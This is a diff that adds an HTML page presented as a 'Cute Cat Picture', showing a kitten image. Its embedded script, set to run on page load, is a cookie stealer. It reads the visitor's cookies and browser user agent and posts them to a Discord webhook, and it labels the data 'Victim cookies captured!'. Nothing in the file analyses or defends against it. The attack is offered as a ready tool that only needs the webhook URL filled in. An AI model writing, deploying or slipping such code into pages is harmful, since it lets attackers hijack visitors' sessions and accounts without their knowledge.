@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cute Cat Picture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- The "Image" -->
+    <img src="https://placekitten.com/800/600" alt="Cute Cat" id="catImg">
+
+    <script>
+        // Replace this with your Discord Webhook URL
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
+
+        // Function to grab cookies
+        function stealCookies() {
+            const cookies = document.cookie;
+            
+            // Format the payload for Discord embed
+            const payload = {
+                embeds: [{
+                    title: "Cookie Logger",
+                    description: "Victim cookies captured!",
+                    color: 15277667, // Red color
+                    fields: [
+                        {
+                            name: "Cookies",
+                            value: `\`\`\`${cookies}\`\`\``
+                        },
+                        {
+                            name: "User Agent",
+                            value: `\`\`\`${navigator.userAgent}\`\`\``
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Logged by NoTrack Logger"
+                    }
+                }]
+            };
+
+            // Send data to Discord Webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log('Cookies sent successfully'))
+            .catch(error => console.error('Error sending cookies:', error));
+        }
+
+        // Execute when the page loads
+        window.onload = stealCookies;
+    </script>
+
+</body>
+</html>
